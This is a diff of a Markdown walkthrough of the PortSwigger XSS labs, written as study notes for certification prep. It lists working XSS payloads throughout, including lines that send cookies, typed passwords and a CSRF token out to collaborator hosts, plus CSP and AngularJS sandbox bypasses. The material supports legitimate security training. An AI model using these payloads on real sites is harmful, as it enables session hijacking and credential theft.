@@ -1,8 +1,8 @@
 ---
 title: Walkthrough - XSS Portswigger labs 
 date: 2025-07-28 3:30:00 + 05:30
-categories: [OSCP Prep, Web]
-tags: [oscp, XSS]    # TAG names should always be lowercase
+categories: [OSCP Prep, Web, BSCP]
+tags: [oscp, xss, bscp]    # TAG names should always be lowercase
 description: An intro to Cross Site Scripting and walkthrough of all 30 portswigger labs
 ---
 
@@ -12,7 +12,7 @@ This week, I solved all 30 labs on Portswigger to learn about this vulnerability
 
 ##### 1. What is Cross-Site Scripting (XSS)?
 
-XSS is a web vulnerability that lets attackers inject malicious JavaScript into websites, affecting users who visit them. It breaks the browser’s same-origin policy, allowing attackers to access or manipulate sensitive data, impersonate users, or perform actions on their behalf.
+XSS is a web vulnerability that lets attackers inject malicious JavaScript into websites, affecting users who visit them. It breaks the browser's same-origin policy, allowing attackers to access or manipulate sensitive data, impersonate users, or perform actions on their behalf.
 
 ##### 2. Types of XSS
 
@@ -76,7 +76,7 @@ XSS is a web vulnerability that lets attackers inject malicious JavaScript into 
 
 Payload that worked: 
 
-```
+```html
 <script>alert(1)</script>
 ```
 
@@ -90,21 +90,21 @@ This is a reflected XSS where unsanitized input is injected into the HTML and ex
 
 Payload that worked: 
 
-```
+```html
 <script>alert(1)</script>
 ```
 
 Explanation:
 
-This lab has a stored XSS vulnerability, where the payload is saved on the server (in this case in a comment) and executed whenever the page is viewed. Since the input isn’t sanitized or encoded, the browser runs the script automatically. Unlike reflected XSS, this affects every user who loads the page.
+This lab has a stored XSS vulnerability, where the payload is saved on the server (in this case in a comment) and executed whenever the page is viewed. Since the input isn't sanitized or encoded, the browser runs the script automatically. Unlike reflected XSS, this affects every user who loads the page.
 
 ![](/assets/images/XSS/Pasted%20image%2020250723132917.png)
 
-### 3. DOM XSS in `innerHTML` sink using source `location.search`
+### 3. DOM XSS in `innerHTML` sink using source `location.search`
 
 Payload that worked: 
 
-```
+```html
 "> <script>alert(1)</script>
 ```
 
@@ -115,7 +115,7 @@ In the image below, we can see that searching for a string, let's say "hello" ge
 ![](/assets/images/XSS/Pasted%20image%2020250723143430.png)
 
 
-```
+```html
 <img src="/resources/images/tracker.gif?searchTerms='+query+'">
 ```
 
@@ -124,25 +124,25 @@ The "> closes the img tag and the script tags execute the payload.
 
 Official walkthrough solution:
 
-```
+```html
 "><svg onload=alert(1)>
 ```
 
 Basically, closing the IMG tag is important.
 
-### 4. DOM XSS in `innerHTML` sink using source `location.search`
+### 4. DOM XSS in `innerHTML` sink using source `location.search`
 
 Payloads that worked: 
 
 1. The one I tried:
  
-```
+```html
 <svg onload=alert(1)>
 ```
 
 2. The one in the walkthrough
 
-```
+```html
 <img src=1 onerror=alert(1)>
 ```
 
@@ -152,17 +152,17 @@ Checking out the source code in the webpage (image below) reveals that the doSea
 
 ![](/assets/images/XSS/Pasted%20image%2020250723201231.png)
 
-Well seems simple, so I tried the normal <script>alert(1)</script> payload. And it didn't work. 
+Well seems simple, so I tried the normal `<script>alert(1)</script>` payload. And it didn't work. 
 
 ![](/assets/images/XSS/Pasted%20image%2020250723202528.png)
 
 As seen, it does get embedded in the page but it doesn't run. But why? This is because of .innerHTML and the way it handles script tags.
 
-Both Lab 3 and 4 are based on DOM based XSS but the script tags don't work in Lab 4 because `document.write()` injects HTML into the live parser stream, so `<script>` tags are executed like normal page content. `innerHTML` modifies the DOM directly, skipping the parser, so script tags are inserted but never run.  That’s why `innerHTML` needs tricks like `onerror` or `onload` to trigger JavaScript.
+Both Lab 3 and 4 are based on DOM based XSS but the script tags don't work in Lab 4 because `document.write()` injects HTML into the live parser stream, so `<script>` tags are executed like normal page content. `innerHTML` modifies the DOM directly, skipping the parser, so script tags are inserted but never run.  That's why `innerHTML` needs tricks like `onerror` or `onload` to trigger JavaScript.
 
 For further reference I found this post which helped me - https://security.stackexchange.com/questions/60861/why-are-scripts-injected-through-innerhtml-not-executed-whilst-onerror-and-other
 
-### 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
+### 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
 
 Payload that worked
 
@@ -196,7 +196,7 @@ NOTE that this is a problem with the old version of jQuery. Check out - CVE-2011
 
 Payload that worked:
 
-```
+```html
 <iframe src="https://LABID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```
 
@@ -216,7 +216,7 @@ https://LABID.web-security-academy.net/#<img src=x onerror=print()>
 
 To solve the lab, you must simulate a phishing attack, sending the malicious link to a victim. This is done via an iframe on the exploit server:
 
-```
+```html
 <iframe src="https://LABID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```
 
@@ -226,7 +226,7 @@ This iframe appends the payload to the URL after loading the lab page, triggerin
 
 Payload that worked:
 
-```
+```html
 a" autofocus onfocus="alert(1)"
 ``` 
 
@@ -238,13 +238,13 @@ The regular payload with script tags does get embedded but doing 'edit as HTML' 
 
 What we have:
 
-```
+```html
 <input type="text" placeholder="Search the blog..." name="search" value="STUFF HERE">
 ```
 
 Now to escape the attribute, we will first put a random character or string and close it with a quote. Then we will put the payload in.
 
-```
+```html
 a" autofocus onfocus="alert(1)"
 ```
 
@@ -252,17 +252,17 @@ This payload tells the browser to autofocus to the input element and onfocus, ex
 
 I also tried:
 
-```
+```html
 a" onfocus="alert(1)" autofocus
 ```
 
 However, for this, I needed to click on the input element for it to work, seems like autofocus must be put in first.
 
-### 8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded
+### 8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded
 
 Payload that worked:
 
-```
+```javascript
 javascript:alert(1)
 ```
 
@@ -282,7 +282,7 @@ We had exploited a similar condition in Lab 5 where there was href. Using the sa
 
 Payload that worked:
 
-```
+```javascript
 a'; alert(1);//
 ```
 
@@ -295,7 +295,7 @@ Reading the source code shows that the query is reflected at 3 places.
 
 ![](/assets/images/XSS/Pasted%20image%2020250725002424.png)
 
-```
+```javascript
 var searchTerms = 'hello';
 document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
 ```
@@ -306,11 +306,11 @@ Why the payload doesn't work in img tag.
 1. A regular payload with script tags won't work as encodeURIComponent() function encodes it. 
 2. The alert doesn't get parsed to it as the var searchTerm line is closed with the quote and ended with a semi-colon, and the payload is added after that.
 
-### 10. DOM XSS in `document.write` sink using source `location.search` inside a select element
+### 10. DOM XSS in `document.write` sink using source `location.search` inside a select element
 
 Payload that worked:
 
-```
+```html
 <script>alert(1)</script>
 ```
 
@@ -335,14 +335,15 @@ Since there is no encoding, a simple `<script>alert(1)</script>` does the job.
 ### 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 
 Payload that worked:
-
+{% raw %}
 ```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
+{% endraw %}
 
 Methodology and explanation:
 
-This site does use angularJS. It considers anything inside {{}} - double curly brackets to be a part of its code and executes its. Putting in {{1+1}} will display 2.
+This site does use angularJS. It considers anything inside {% raw %}{{}}{% endraw %} - double curly brackets to be a part of its code and executes its. Putting in {% raw %}{{1+1}}{% endraw %} will display 2.
 
 ![](/assets/images/XSS/Pasted%20image%2020250725013136.png)
 
@@ -352,7 +353,7 @@ Referring to this cheatsheet https://portswigger.net/web-security/cross-site-scr
 
 Payload that worked:
 
-```
+```javascript
 \"};alert(1);//
 ```
 
@@ -374,7 +375,7 @@ Looking at the requests and responses in BurpSuite shows that we are getting res
 
 We need to bypass the json format and get it to execute the XSS. Playing around with it finally gets us the following payload:
 
-```
+```javascript
 \"};alert(1);// 
 ```
 
@@ -388,7 +389,7 @@ Explanation :
 
 Payload that worked:
 
-```
+```html
 <> <img src=x onerror=alert(1)> <>
 ```
 
@@ -412,7 +413,7 @@ I confirmed that in the previous case the tag was html encoded:
 
 Now the script tags should work in theory, but it doesn't work so we can try using the img tag with the following payload. The last brackets will get deleted, and the first one will get encoded. The middle one executes as intended.
 
-```
+```html
 <> <img src=x onerror=alert(1)> <>
 ```
 
@@ -420,7 +421,7 @@ Now the script tags should work in theory, but it doesn't work so we can try usi
 
 Payload that worked:
 
-```
+```html
 <iframe src="https://LABID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
 
@@ -437,7 +438,7 @@ Well, this is a simple but longer lab. I don't have burp pro at the time of writ
 
 Payload that worked:
 
-```
+```html
 <hello id=x onfocus=alert(document.cookie) tabindex=0>Hello</hello>
 ```
 
@@ -447,13 +448,13 @@ We know that only custom tags will work here, so we create a custom tag `hello`.
 
 We can try to send it as iframe like we did on `6. DOM XSS in jQuery selector sink using a hashchange event` but upon viewing the exploit, it seems to be failing
 
-```
+```html
 <iframe src="https://LABID.web-security-academy.net/?search=%3Chello+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D0%3EHello%3C%2Fhello%3E/#x"></iframe>
 ```
 
 Therefore in order to exploit it, we can use script tags and assign the malicious URL to a location keyword. This will autodirect to our exploit, triggering the payload
 
-```
+```html
 <script>
 location='https://LABID.web-security-academy.net/?search=%3Chello+id%3Dx+onfocus%3Dalert%281%29+tabindex%3D0%3Ehello%3C%2Fhello%3E#x';
 </script>
@@ -463,7 +464,7 @@ location='https://LABID.web-security-academy.net/?search=%3Chello+id%3Dx+onfocus
 
 Payload that worked:
 
-```
+```html
 <svg><animatetransform onbegin=alert(1) attributeName=transform>
 ```
 
@@ -517,7 +518,7 @@ This particular lab was strange and I am not sure I understand it completely.
 
 Payload that worked:
 
-```
+```html
 </script><script>alert(1)</script>
 ```
 
@@ -529,7 +530,7 @@ Putting in a random string and checking the source code shows us that we are ins
 
 First we can try the payload from `9. Reflected XSS into a JavaScript string with angle brackets HTML encoded`
 
-```
+```javascript
 a'; alert(1);//
 ```
 
@@ -545,7 +546,7 @@ As we can see, it did the trick. This should trigger our payload.
 
 Payload that worked:
 
-```
+```javascript
 \';alert(1);//
 ```
 
@@ -559,7 +560,7 @@ Very similar to `18. Reflected XSS into a JavaScript string with single quote an
 
 Now in order to trigger the XSS, we need to first close the single quotes. Since it is getting escaped, we will just put a backslash in to escape it. Then we can put a semicolon to end that line.  We did so with the following payload.
 
-```
+```javascript
 \';hello
 ```
 
@@ -569,11 +570,11 @@ As we can see hello, it outside the quote.
 
 Now we can just put the XSS payload in place of hello and comment out the rest of the line. 
 
-### 20. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+### 20. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
 
 Payload that worked:
 
-```
+```html
 http://website&#x27;-alert(1)-&#x27;
 ```
 
@@ -625,7 +626,7 @@ Upon looking up their significance, I saw that they can have 1. Multiline string
 
 Payload that worked:
 
-```
+```html
 <script>fetch('https://BURPID.oastify.com/?cookie=' + document.cookie);</script>
 ```
 
@@ -637,13 +638,13 @@ As always we first try to find a reflection point. The comments seemed to be ref
 
 Note: We can do this cookie stealing attack without burp collaborator, but we were forced to do it with it because of safety issues. Otherwise we can point the payload to a html page we host on a server which will execute a javascript file which will send us the cookies back. HTB Academy has a bunch of payloads and a practice lab where we can do this without collaborator. Anyways, I was making a mistake with quotes:
 
-```
+```html
 <script>fetch('https://BURPID.oastify.com/?cookie=document.cookie');</script>
 ```
 
 The `document.cookie` must be outside the URL quotes to work. The following payload should work. 
 
-```
+```html
 <script>fetch('https://BURPID.oastify.com/?cookie=' + document.cookie);</script>
 ```
 
@@ -651,7 +652,7 @@ The `document.cookie` must be outside the URL quotes to work. The following payl
 
 Payload that worked:
 
-```
+```html
 <input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
 ```
 
@@ -671,13 +672,13 @@ Simply use the credentials to login.
 
 Payload that worked:
 
-```
+```html
 <script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
 ```
 
 Methodology and explanation:
 
-We did a CSRF here using XSS. We used a stored XSS in the comments section to steal the CSRF token of another user. CSRF is a basically when the browser performs unauthorized/unwanted actions, in this case stealing the CSRF token. I had to use the solution myself as this is the first time I am doing a CSRF attack and I don't know javascript as of now. 
+We did a CSRF here using XSS. We used a stored XSS in the comments section to steal the CSRF token of another user. CSRF is a basically when the browser performs unauthorized/unwanted actions, in this case stealing the CSRF token. I had to use the solution myself as this is the first time I am doing a CSRF attack and I don't know javascript as of now.
 
 ### 25. Reflected XSS with AngularJS sandbox escape without strings
 
@@ -717,7 +718,7 @@ Payload that worked:
 
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-(all-browsers)-shorter-using-assignment
 
-```
+```html
 <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
 ```
 
@@ -733,7 +734,7 @@ Note that we used \#x to make sure that it focuses on the input tag automaticall
 
 Next we can just put it in script tags and send it via exploit server
 
-```
+```html
 <script>
 location='https://0a6d006e049eef7b81879d990038001c.web-security-academy.net/?search=%3Cinput+id%3Dx+ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28z%3Dalert%29%28document.cookie%29%27%3E#x'
 </script>
@@ -744,11 +745,11 @@ Understanding the payload:
 Content Security Policy is a browser feature for restricting how code runs on browser. 
 This payload uses the `ng-focus` directive to execute when the input field is focused, passing `$event.composedPath()` to the `orderBy` filter. The filter argument `'(z=alert)(document.cookie)'` is parsed by Angular as an expression that assigns `alert` to `z` and then immediately calls `z(document.cookie)`, effectively executing `alert(document.cookie)`. Since this code runs entirely within Angular's expression context and avoids inline scripts, `eval`, or quoted strings, it successfully bypasses standard Content Security Policy (CSP) restrictions.
 
-### 27. Reflected XSS with event handlers and `href` attributes blocked
+### 27. Reflected XSS with event handlers and `href` attributes blocked
 
 Payload that worked:
 
-```
+```html
 <svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">click me</text></a> 
 ```
 
@@ -758,23 +759,23 @@ Methodology and explanation:
 
 Step one was to create a clickable text element. As per the lab description, it seems like there is an automated script that will execute and try to click on elements with text "click me". We know that \<a\> tags are allowed. We can try to put a bunch of different tags and see which ones are valid in the search box, either manually or using intruder. I found that the svg tag was allowed. Using \<svg\> and \<a\> together to make a clickable link didn't work. 
 
-```
+```html
 <svg><a>click me</a>
 ```
 
 A quick google search showed that text tags must be used to put text in the svg tag. 
 
-```
+```html
 <svg><a><text x="20" y="20">click me</text></a>
 ```
 
-Now that we have a clickable text link, we need to execute our payload. `href` attributes are blocked otherwise `href=javascript:alert(1)` would have worked like it had in this lab -`5. DOM XSS in jQuery anchor `href` attribute sink using location.search source`. We need to find which other tags are allowed. Manually checking or using intruder shows that `animate` tag is allowed too.
+Now that we have a clickable text link, we need to execute our payload. `href` attributes are blocked otherwise `href=javascript:alert(1)` would have worked like it had in this lab -`5. DOM XSS in jQuery anchor `href` attribute sink using location.search source`. We need to find which other tags are allowed. Manually checking or using intruder shows that `animate` tag is allowed too.
 
 How does animate work?
 
 Example 
 
-```
+```html
 <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
   <rect width="10" height="10">
     <animate
@@ -788,7 +789,7 @@ Example
 
 This is a sample code from https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/animate. Look at the animate tag. What it does is, that it assigns fills in an attribute `rx` with values `0;5;0` to the tags it is written after. Ignore `dur`, and `repeatCount` for now. So without animate tag and the `dur` and `repeatCount`, the code would look like:
 
-```
+```html
 <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
   <rect rx="0;5;0" width="10" height="10">
   </rect>
@@ -797,7 +798,7 @@ This is a sample code from https://developer.mozilla.org/en-US/docs/Web/SVG/Refe
 
 Now that we know what the animate tag does, we can use it to execute our XSS payload. We know that \<a\> tag can be used with `href` to execute the payload. Since `href` is blocked, we can try to use it using the trick of `attributeName` and `values` with animate tag. 
 
-```
+```html
 <svg>
 	<a>
 		<animate attributeName="href" values="javascript:alert(1)">
@@ -814,7 +815,7 @@ This payload executes the XSS.
 
 Payload that worked:
 
-```
+```javascript
 1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{'x':'
 ```
 
@@ -832,7 +833,7 @@ Trying this, we can see that the additional parameter is indeed getting inserted
 
 The fetch function is URL encoded. It is sending a post request to the backend to retrieve the pages.
 
-```
+```javascript
 href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1%26hello'}).finally(_ => window.location = '/')"
 ```
 
@@ -844,7 +845,7 @@ fetch('/analytics',{method:'post',body:'/post?postId=1&hello'}).finally(_=>windo
 
 The payload should look something like this:
 
-```
+```javascript
 1&'},PAYLOADHERE,{'x':'
 ```
 
@@ -856,7 +857,7 @@ fetch('/analytics',{method:'post',body:'/post?postId=1&'},PAYLOADHERE,{'x':''}).
 
 The following payload works (explanation below):
 
-```
+```javascript
 1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{'x':'
 ```
 
@@ -894,11 +895,11 @@ When `window + ''` runs, the `toString()` function is triggered, which we had ov
 
 Payloads that worked:
 
-```
+```html
 "></form><form class="login-form" name="evil-form" action="https://BURPID.oastify.com/token" method="GET"><button class="button" type="submit">Click Me</button>
 ```
 
-```
+```html
 <html>
   <!-- CSRF PoC - generated by Burp Suite Professional -->
   <body>
@@ -928,7 +929,7 @@ We find that the reflection point is in the URL which can be seen by appending &
 
 We can now try to make a malicious form and a button within this to steal the CSRF token and send it to the target user.
 
-```
+```html
 "></form><form class="login-form" name="evil-form" action="https://BURPID.oastify.com/token" method="GET"><button class="button" type="submit">Click Me</button>'
 ```
 
@@ -936,7 +937,7 @@ We can now try to make a malicious form and a button within this to steal the CS
 
 We will send this URL to the target user then. remember to remove id=wiener from the URL otherwise it won't work.
 
-```
+```html
 <script>
 location='https://0aa9000303071ad180c844c3009f0057.web-security-academy.net/my-account?&email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://kf34q7u0443cyc1m3246089wzn5et4ht.oastify.com/token%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3EClick%20Me%3C/button%3E'
 </script>
@@ -956,7 +957,7 @@ We will copy this PoC.
 
 We just need to replace the CSRF token and the value of the email field and send it to the target via the exploit server.
 
-```
+```html
 <html>
   <!-- CSRF PoC - generated by Burp Suite Professional -->
   <body>
@@ -978,7 +979,7 @@ We just need to replace the CSRF token and the value of the email field and send
 
 Payloads that worked:
 
-```
+```html
 search=<script>alert(1)</script>&token=1;script-src-elem 'unsafe-inline'
 ```
 
